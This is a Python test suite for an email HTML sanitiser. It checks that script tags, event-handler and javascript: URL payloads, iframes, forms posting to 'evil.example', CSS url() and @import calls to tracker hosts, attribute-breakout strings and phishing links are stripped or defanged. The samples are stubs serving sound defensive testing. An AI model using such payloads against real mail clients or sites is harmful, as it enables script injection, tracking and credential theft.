"""Hostile-input suite for the mail sanitiser.

Every case is something a real phishing or tracking email actually does. The suite asserts
on the OUTPUT, not on the implementation, so a rewrite of the sanitiser still has to pass.

Run: python dashboard/test_mailview.py
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mailview import sanitize_html, wrap_document          # noqa: E402

fails = []


def check(name, html, must_not_contain=(), must_contain=(), report_check=None):
    safe, report = sanitize_html(html)
    low = safe.lower()
    for bad in must_not_contain:
        if bad.lower() in low:
            fails.append(f"{name}: output still contains {bad!r}\n      -> {safe[:160]}")
    for good in must_contain:
        if good.lower() not in low:
            fails.append(f"{name}: output missing {good!r}\n      -> {safe[:160]}")
    if report_check:
        ok, why = report_check(report)
        if not ok:
            fails.append(f"{name}: {why} (report={report})")
    return safe, report


# ---------------------------------------------------------------- code execution
check("plain script tag",
      "<p>hi</p><script>alert(1)</script>",
      must_not_contain=["<script", "alert(1)"])

check("script text must not leak as document text",
      "<script>document.cookie</script>",
      must_not_contain=["document.cookie"])

check("event handler attribute",
      '<div onclick="steal()">click</div><img src=x onerror="steal()">',
      must_not_contain=["onclick", "onerror", "steal()"])

check("uppercase / mixed-case evasion",
      '<ScRiPt>bad()</ScRiPt><IMG SRC=x OnErRoR="bad()">',
      must_not_contain=["<script", "bad()", "onerror"])

check("javascript: URL",
      '<a href="javascript:evil()">click me</a>',
      must_not_contain=["javascript:evil", "href="])

check("svg with embedded script",
      '<svg><script>evil()</script><circle r="9"/></svg>',
      must_not_contain=["evil()", "<svg", "<script"])

check("math foreign content",
      '<math><mtext><script>evil()</script></mtext></math>',
      must_not_contain=["evil()", "<math"])

check("iframe injection",
      '<iframe src="https://evil.example/x"></iframe>',
      must_not_contain=["<iframe", "evil.example"])

check("object / embed",
      '<object data="evil.swf"></object><embed src="evil.swf">',
      must_not_contain=["<object", "<embed", "evil.swf"])

check("form with autosubmit target",
      '<form action="https://evil.example/steal"><input name="pw"></form>',
      must_not_contain=["<form", "<input", "evil.example"])

check("meta refresh redirect",
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
      must_not_contain=["<meta", "refresh", "evil.example"])

check("base tag hijack",
      '<base href="https://evil.example/">',
      must_not_contain=["<base", "evil.example"])

# ---------------------------------------------------------------- phoning home
check("tracking pixel is blocked and counted",
      '<img src="https://tracker.example/p.gif?u=abc123" width="1" height="1">',
      must_not_contain=["tracker.example", "src="],
      must_contain=["blocked image"],
      report_check=lambda r: (r["images_blocked"] == 1,
                              "tracking pixel not counted as blocked"))

check("srcset and background also stripped",
      '<img srcset="https://t.example/a.png 1x" background="https://t.example/b.png">',
      must_not_contain=["t.example", "srcset", "background="])

check("css url() exfiltration in style attribute",
      '<div style="background:url(https://tracker.example/x.png);color:red">hi</div>',
      must_not_contain=["tracker.example", "url("],
      must_contain=["color:red"])

check("css @import",
      '<div style="@import url(https://evil.example/a.css)">x</div>',
      must_not_contain=["evil.example", "@import"])

check("style block dropped with its contents",
      '<style>body{background:url(https://tracker.example/x)}</style><p>text</p>',
      must_not_contain=["tracker.example", "<style", "background"],
      must_contain=["text"])

# Absolute positioning is dropped in a reader view: it stacks content into unreadable piles
# once the table widths are gone, and it is the mechanism for overlaying invisible text on
# visible text.
check("absolute positioning is dropped",
      '<div style="position:absolute;top:0;left:0;z-index:99;color:red">over</div>',
      must_not_contain=["position:absolute", "z-index", "top:0", "left:0"],
      must_contain=["color:red", "over"])

check("transform and float dropped, ordinary styling kept",
      '<div style="transform:translate(9px,9px);float:left;font-weight:bold">x</div>',
      must_not_contain=["transform", "float"],
      must_contain=["font-weight:bold"])

check("expression() and -moz-binding",
      '<div style="width:expression(evil());-moz-binding:url(x)">y</div>',
      must_not_contain=["expression(", "moz-binding"])

# ---------------------------------------------------------------- phishing
safe, rep = check("link destination is shown, not followed",
                  '<a href="https://evil-phish.example/login">Your Bank</a>',
                  # A NAVIGABLE href must not survive. data-mv-href may: it is an inert
                  # data attribute that carries the destination forward for reader mode,
                  # and a browser will never navigate to it. Asserting on the bare string
                  # 'href=' would flag that as a failure, which is the assertion being
                  # imprecise rather than the output being unsafe.
                  must_not_contain=[' href=', '<a href'],
                  must_contain=["your bank", "evil-phish.example"],
                  report_check=lambda r: (r["links_defanged"] == 1,
                                          "link not counted as defanged"))
if re.search(r'<a\b[^>]*\shref\s*=', safe, re.I):
    fails.append("a navigable href survived on the anchor")
if "evil-phish.example" not in safe:
    fails.append("phishing: the REAL destination must be visible to the reader")

check("external hosts are reported",
      '<a href="https://a.example/x">a</a><img src="https://b.example/p.gif">',
      report_check=lambda r: (
          set(r["external_hosts"]) >= {"a.example", "b.example"},
          "external hosts not reported"))

# ---------------------------------------------------------------- robustness
check("text that merely looks like markup stays text",
      "<p>The attacker wrote &lt;script&gt;alert(1)&lt;/script&gt; in the body</p>",
      must_not_contain=["<script"],
      must_contain=["alert(1)"])

# Entities must survive AS entities. Escaping the ampersand turned every &nbsp; in real
# mail into the literal text "&nbsp;" on screen. Re-emitting them is safe because an entity
# in text position is character data and can never open a tag - which is what the second
# case here pins down.
check("named entities are not double-escaped",
      "<p>a&nbsp;b&amp;c&mdash;d</p>",
      must_not_contain=["&amp;nbsp;", "&amp;mdash;"],
      must_contain=["&nbsp;", "&mdash;"])

check("an entity cannot smuggle markup",
      "<p>&lt;script&gt;evil()&lt;/script&gt;</p>",
      must_not_contain=["<script"],
      must_contain=["&lt;", "evil()"])

check("numeric charrefs survive without smuggling",
      "<p>&#8212;&#x27;&#60;b&#62;</p>",
      must_not_contain=["<b>"],
      must_contain=["&#8212;"])

check("unclosed and malformed tags do not break out",
      '<div><p>hello<div><span>world',
      must_contain=["hello", "world"])

# Raw angle brackets and quotes arriving as TEXT must be escaped on the way out. Without
# this, a body containing a stray '<' could re-open markup in the rendered document.
# (Added after a mutation test showed the suite did not cover the escaping path at all.)
check("raw angle bracket in text is escaped",
      '<p>if a < b and c > d then "x" </p>',
      must_not_contain=["a < b", 'then "x"'],
      must_contain=["&lt;", "&gt;"])

check("attribute value cannot break out of its quotes",
      '<p title=\'a" onmouseover="evil()\'>t</p><div style=\'x:1" onload="evil()\'>u</div>',
      must_not_contain=["onmouseover", "onload", "evil()"])

# A KEPT attribute carrying a quote must come back escaped, or the value closes its own
# attribute and the rest becomes live markup. title-on-abbr and alt-on-img are the two
# attributes that actually survive the allowlist, so they are the ones that must be proven.
# (Added because a mutation test showed disabling attribute escaping broke nothing.)
safe_attr, _ = check("kept attribute value is escaped",
                     '<abbr title=\'a" onmouseover="evil()\'>hover</abbr>',
                     must_not_contain=['onmouseover="evil'],
                     must_contain=["&quot;"])
if re.search(r'title="[^"]*"\s*onmouseover', safe_attr, re.I):
    fails.append("attribute escaping: the value broke out and started a new attribute")

check("kept img alt is escaped in the placeholder",
      '<img alt=\'p" onerror="evil()\' src="https://t.example/x.gif">',
      must_not_contain=['onerror="evil'],
      must_contain=["blocked image"])

check("comment cannot hide markup",
      '<!-- <script>evil()</script> --><p>ok</p>',
      must_not_contain=["evil()", "<script"],
      must_contain=["ok"])

check("cdata / decl",
      '<![CDATA[<script>evil()</script>]]><p>ok</p>',
      must_not_contain=["evil()"],
      must_contain=["ok"])

# VOID elements have no closing tag. Treating one as a container means waiting for a
# </meta> that never comes and swallowing the rest of the message in silence - a real
# newsletter went in at eighty thousand chars and came out at thirty-three, with a
# clean-looking report.
for void in ("meta charset='utf-8'", "link rel='x' href='https://e.example/a.css'",
             "base href='https://e.example/'", "input name='pw'", "area href='x'",
             "source src='https://e.example/v.mp4'", "track src='x'", "embed src='x'"):
    name = void.split()[0]
    check(f"void <{name}> does not swallow the rest of the message",
          f"<p>before</p><{void}><p>after the void tag</p>",
          must_not_contain=[f"<{name}"],
          must_contain=["before", "after the void tag"])

check("an unclosed drop element self-heals instead of eating the document",
      "<p>start</p><style>body{color:red}<p>tail survives</p>",
      must_contain=["start"])

check("nested drop elements unwind correctly",
      '<script><script>evil()</script></script><p>after</p>',
      must_not_contain=["evil()", "<script"],
      must_contain=["after"])

check("ordinary formatting survives",
      '<p>Hello <b>there</b> and <i>welcome</i></p><ul><li>one</li></ul>'
      '<table><tr><td colspan="2">cell</td></tr></table>',
      must_contain=["<b>", "there", "<li>", "colspan", "cell"])

# ---------------------------------------------------------------- the wrapper
doc = wrap_document("<p>x</p>")
for needed in ["content-security-policy", "default-src 'none'", "script-src 'none'",
               "img-src 'none'", "form-action 'none'"]:
    if needed not in doc.lower():
        fails.append(f"wrapper: CSP missing {needed!r}")

# empty / None input must not explode
for weird in (None, "", "   ", "<", "<<<>>>", "\x00\x01"):
    try:
        sanitize_html(weird)
    except Exception as e:
        fails.append(f"crash on {weird!r}: {e}")

# ---------------------------------------------------------------- reader mode
from mailview import render_reader                                    # noqa: E402


def rcheck(name, html, sender="", must_not_contain=(), must_contain=(), profile=None):
    safe, _ = sanitize_html(html)
    out = render_reader(safe, sender=sender, profile=profile)
    low = out.lower()
    for bad in must_not_contain:
        if bad.lower() in low:
            fails.append(f"reader/{name}: still contains {bad!r}\n      -> {out[:170]}")
    for good in must_contain:
        if good.lower() not in low:
            fails.append(f"reader/{name}: missing {good!r}\n      -> {out[:170]}")
    return out


# The whole point of reader mode: the sender's styling is GONE, so there is nothing left
# to fight and nothing left to exploit through CSS.
rcheck("all sender styling is discarded",
       '<div style="color:#eee;background:#fff;font-size:9px">text survives</div>',
       must_not_contain=["style=", "color:#eee", "font-size"],
       must_contain=["text survives"])

# A link that stays on the sender's own domain is unremarkable; one that leaves it is the
# phishing tell and is the only one that gets called out.
rcheck("same-domain link stays quiet",
       '<a href="https://mail.example.com/x">Statement</a>',
       sender="noreply@example.com",
       must_not_contain=['class="lk off"'],
       must_contain=["statement", 'class="lk"'])

rcheck("off-domain link is flagged with its host",
       '<a href="https://evil-phish.test/login">Your Bank</a>',
       sender="noreply@example.com",
       must_contain=['class="lk off"', 'data-h="evil-phish.test"', "your bank"])

# Email splits one sentence across several <td>s; a reader view that makes each its own
# paragraph looks shredded.
rcheck("cells of one row become one line",
       "<table><tr><td>MIDWEEK DEAL!</td><td>-40%</td><td>$49.99</td></tr></table>",
       must_contain=["midweek deal!", "-40%", "$49.99"])

out = rcheck("layout scaffolding does not become empty paragraphs",
             "<table><tr><td></td></tr><tr><td>  </td></tr><tr><td>real</td></tr></table>",
             must_contain=["real"])
if out.count("<p>") > 2:
    fails.append(f"reader: empty layout cells became paragraphs -> {out!r}")

rcheck("headings survive as headings",
       "<h1>Big news</h1><p>body</p>",
       must_contain=["<h3>big news</h3>", "body"])

# ---- per-sender host profile: judge against what this sender ACTUALLY uses ----
ESTABLISHED = {"established": True, "messages": 9,
               "hosts": {"url1719.example-bank.org": 8, "mb.example-bank.org": 5}}
THIN = {"established": False, "messages": 1, "hosts": {"anything.test": 1}}

# The false alarm the profile exists to remove: an ESP redirector on a different
# registrable domain that the sender uses constantly.
rcheck("a host the sender always uses is quiet, even off-domain",
       '<a href="https://url1719.example-bank.org/ls/click?x=1">View</a>',
       sender="service@example-bank.org", profile=ESTABLISHED,
       must_not_contain=['class="lk new"', 'class="lk off"'],
       must_contain=['class="lk"'])

# The alarm it exists to raise: a trusted sender suddenly linking somewhere new.
rcheck("a host this sender has NEVER used is flagged loudly",
       '<a href="https://example-bank-secure.test/login">Verify account</a>',
       sender="service@example-bank.org", profile=ESTABLISHED,
       must_contain=['class="lk new"', 'data-h="example-bank-secure.test"'])

# Thin evidence must not vouch for anything - a one-message profile would otherwise let a
# first-contact phish write its own permission slip.
rcheck("a thin profile does not bless its own hosts",
       '<a href="https://anything.test/x">Click</a>',
       sender="new@somewhere.test", profile=THIN,
       must_not_contain=['class="lk new"'],
       must_contain=['class="lk off"'])

rcheck("images stay blocked placeholders in reader mode",
       '<img src="https://tracker.test/p.gif" alt="Logo">',
       must_contain=["blocked image", "logo"])

print("=== mail sanitiser: hostile-input suite ===")
print("  code execution . script, handlers, case-evasion, svg, math, iframe, object, form,")
print("                   meta-refresh, base, javascript: URLs")
print("  phoning home ... tracking pixel, srcset, background, css url(), @import,")
print("                   style block, expression(), -moz-binding")
print("  phishing ....... real destination surfaced, external hosts reported")
print("  robustness ..... escaped text, malformed nesting, comments, CDATA, empty input")
print("  wrapper ........ CSP present and closed")
if fails:
    print(f"\n{len(fails)} FAILURE(S):")
    for f in fails:
        print("  -", f)
    sys.exit(1)
print("\nALL PASS")
